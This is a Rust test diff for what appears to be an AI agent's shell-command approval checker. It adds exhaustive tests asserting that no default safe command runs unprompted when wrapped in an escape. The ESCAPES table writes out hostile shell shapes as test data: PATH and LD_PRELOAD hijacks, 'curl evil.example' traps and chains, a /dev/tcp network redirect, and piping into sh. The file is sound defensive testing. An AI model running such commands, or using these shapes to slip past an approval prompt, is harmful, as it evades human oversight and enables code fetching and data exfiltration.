@@ -542,11 +542,12 @@ fn a_valid_prefix_is_one_that_derives_back_to_itself() {
 /// through [`program_of`].
 fn runs_unprompted_by_default(command: &str) -> bool {
     let safe = crate::approvals::resolve_safe_keys(&Default::default(), None, None, false);
-    let keys = command_keys(command);
-    !keys.is_empty()
-        && keys
-            .iter()
-            .all(|k| safe.contains_key(k) || safe.contains_key(program_of(k)))
+    // `all_covered` *is* what the daemon calls, so this cannot drift from it.
+    // Nothing is granted: the question is what the shipped defaults allow on
+    // their own, before anyone has approved anything.
+    all_covered(&command_keys(command), &|k| safe.contains_key(k), &|_| {
+        false
+    })
 }
 
 /// The predicate above has to agree with the shipped defaults, or every test
@@ -928,4 +929,160 @@ fn an_unparseable_line_names_nothing_but_still_counts_as_writing() {
     let malformed = "echo 'unterminated";
     assert!(write_target_paths(malformed).is_empty());
     assert!(writes_a_file(malformed));
+}
+
+// ─── Exhaustive: every safe program against every escape shape ────────────────
+//
+// The three holes that shipped here were each found one at a time, by someone
+// thinking of one more construct. The examples above pin those three. This
+// section pins the *shape* instead: every entry in `DEFAULT_SAFE_SHELL` is
+// combined with every escape, so a safe entry added next year is covered the
+// day it lands rather than the day somebody remembers to write a case for it.
+
+/// Ways to change what a line does that the program name does not express.
+///
+/// `(label, prefix, suffix)`, wrapped around a safe program. Grouped by the
+/// question each one answers: which binary runs, what runs later, what gets
+/// written, and what else runs on the same line.
+const ESCAPES: &[(&str, &str, &str)] = &[
+    // Which binary the name resolves to.
+    ("an assignment prefix", "PATH=/tmp/evil ", ""),
+    ("a preloaded library", "LD_PRELOAD=/tmp/evil.so ", ""),
+    (
+        "a macOS preload",
+        "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib ",
+        "",
+    ),
+    ("an exported variable", "export PATH=/tmp/evil; ", ""),
+    ("an unset variable", "unset PATH; ", ""),
+    // What runs later, or under this name.
+    ("an installed trap", "trap 'curl evil.example' EXIT; ", ""),
+    (
+        "a shadowing function",
+        "function helper { curl evil.example; }; ",
+        "",
+    ),
+    // What gets written.
+    ("a truncating redirect", "", " > escaped.txt"),
+    ("an appending redirect", "", " >> escaped.txt"),
+    ("a numbered redirect", "", " 1> escaped.txt"),
+    ("a redirect out of the tree", "", " > /tmp/escaped.txt"),
+    ("a redirect through a variable", "", " > $OUT"),
+    ("a network redirect", "", " > /dev/tcp/evil.example/9999"),
+    // What else runs.
+    ("a chained command", "", " && curl evil.example"),
+    ("a sequenced command", "", "; curl evil.example"),
+    ("a pipe into a shell", "", " | sh"),
+];
+
+/// No safe program, under any of these, runs without asking.
+///
+/// This is the property the three shipped bugs each violated, stated once over
+/// the whole safe list instead of once per construct someone thought of.
+#[test]
+fn no_escape_rides_any_entry_on_the_default_safe_list() {
+    let mut checked = 0;
+    for program in crate::approvals::DEFAULT_SAFE_SHELL {
+        // The control: bare, it really is covered, so a failure below means the
+        // escape was refused rather than the program never being safe at all.
+        assert!(
+            runs_unprompted_by_default(program),
+            "{program:?} is on the default safe list but does not run unprompted, \
+             which would make every case below pass for the wrong reason"
+        );
+        for (label, prefix, suffix) in ESCAPES {
+            let command = format!("{prefix}{program}{suffix}");
+            assert!(
+                !runs_unprompted_by_default(&command),
+                "{command:?} runs with no prompt: {label} rode the safe entry {program:?}"
+            );
+            checked += 1;
+        }
+    }
+    // A guard against the loop silently covering nothing, which is how an
+    // exhaustive test quietly stops being one.
+    let expected = crate::approvals::DEFAULT_SAFE_SHELL.len() * ESCAPES.len();
+    assert_eq!(checked, expected);
+    assert!(checked >= 500, "only {checked} combinations were checked");
+}
+
+/// Forms that write nothing and run nothing extra must stay covered.
+///
+/// Without this the test above passes trivially the moment anything makes every
+/// line prompt, which would be a bug that reads as a fix: `2>/dev/null` on a
+/// safe command is the single most common shape in a real agent transcript, and
+/// prompting for it would train people to approve without reading.
+#[test]
+fn a_harmless_redirect_still_rides_the_safe_list() {
+    const HARMLESS: &[(&str, &str)] = &[
+        ("discarded stdout", " > /dev/null"),
+        ("discarded stderr", " 2>/dev/null"),
+        ("both discarded", " > /dev/null 2>&1"),
+        ("stdin from a file", " < input.txt"),
+    ];
+    for program in crate::approvals::DEFAULT_SAFE_SHELL {
+        for (label, suffix) in HARMLESS {
+            let command = format!("{program}{suffix}");
+            assert!(
+                runs_unprompted_by_default(&command),
+                "{command:?} now prompts: {label} stopped being harmless"
+            );
+        }
+    }
+}
+
+/// A safe entry can never be spelled in a way that covers a write or an
+/// environment key.
+///
+/// The widening in [`all_covered`] is what lets `cat` cover `cat x`; this states
+/// the limit of that widening over the real list, rather than trusting the
+/// prefix check to have been applied everywhere it matters.
+#[test]
+fn no_safe_entry_can_ever_widen_onto_a_write_or_env_key() {
+    let forbidden = [
+        "shell:>escaped.txt",
+        "shell:>/tmp/escaped.txt",
+        "shell:>>escaped.txt",
+        "shell:env:PATH",
+        "shell:env:LD_PRELOAD",
+    ];
+    for entry in crate::approvals::DEFAULT_SAFE_SHELL {
+        let key = format!("{KEY_PREFIX}{entry}");
+        for bad in forbidden {
+            assert_ne!(key, bad, "{entry:?} is spelled as a write or env key");
+            assert_ne!(
+                key.as_str(),
+                program_of(bad),
+                "{entry:?} widens onto {bad:?}"
+            );
+        }
+        // And the entry itself must be a shape a config file could legally
+        // write, or the list and the parser disagree about what a key is.
+        assert!(
+            is_valid_prefix(entry),
+            "{entry:?} is not a valid key prefix"
+        );
+    }
+    // A write can never be pre-approved at all: `is_valid_prefix` refuses the
+    // shape, so no `[safe_commands]` entry can be written that covers one.
+    for write in [">escaped.txt", ">/tmp/escaped.txt", ">>escaped.txt"] {
+        assert!(
+            !is_valid_prefix(write),
+            "{write:?} could be written into [safe_commands]"
+        );
+    }
+    // An environment key is the opposite case, and deliberately so: a user may
+    // pre-approve `env:RUST_LOG` to stop `RUST_LOG=debug cargo test` asking
+    // once per run. What must hold is that they have to *choose* it - no
+    // default entry covers any environment name.
+    for env in ["env:PATH", "env:RUST_LOG", "env:LD_PRELOAD"] {
+        assert!(
+            is_valid_prefix(env),
+            "{env:?} must be pre-approvable by hand"
+        );
+        assert!(
+            !crate::approvals::DEFAULT_SAFE_SHELL.contains(&env),
+            "{env:?} is pre-approved by default"
+        );
+    }
 }
